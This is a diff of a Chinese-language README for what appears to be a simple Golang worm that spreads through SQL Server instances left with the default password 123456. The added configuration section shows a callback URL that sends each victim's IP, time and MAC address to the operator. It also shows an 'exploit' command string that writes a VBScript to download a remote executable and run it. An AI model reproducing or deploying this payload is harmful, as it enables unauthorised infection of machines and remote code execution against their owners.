@@ -38,11 +38,21 @@ Client 调试运行
 cd client/
 go run main.go func.go
 ```
+配置修改 
 
+func.go 修改里面的域名即可
+```
+url := "http://localhost/callback?ip=" + ip + "&time=" + string(time) + "&mac=" + _mac // 回传信息
+
+var exploit = `echo Set Post = CreateObject("Msxml2.XMLHTTP") >>zl.vbs && echo Set Shell = CreateObject("Wscript.Shell") >>zl.vbs && echo Post.Open "GET","https://remote/1.exe",0 >>zl.vbs && echo Post.Send() >>zl.vbs && echo Set aGet = CreateObject("ADODB.Stream") >>zl.vbs && echo aGet.Mode = 3 >>zl.vbs && echo aGet.Type = 1 >>zl.vbs && echo aGet.Open() >>zl.vbs && echo aGet.Write(Post.responseBody) >>zl.vbs && echo aGet.SaveToFile "zl.exe",2 >>zl.vbs && echo wscript.sleep 1000 >>zl.vbs && echo Shell.Run ("zl.exe") >>zl.vbs && cscript zl.vbs`
+	
+```
 ------------
-漏洞细节：  
-某个机房，里边默认安装了mssql,并且默认密码都是123456
+为什么编写
+
+某个机房，里边默认安装了sqlserver,并且默认密码都是123456 
+
 IP扫描就乱写了。里边还有部分代码不合理
 
 蠕虫登陆后![image](https://raw.githubusercontent.com/dongdong1972/Simple-Golang-Worm/master/image/result.PNG)
----------
+------------
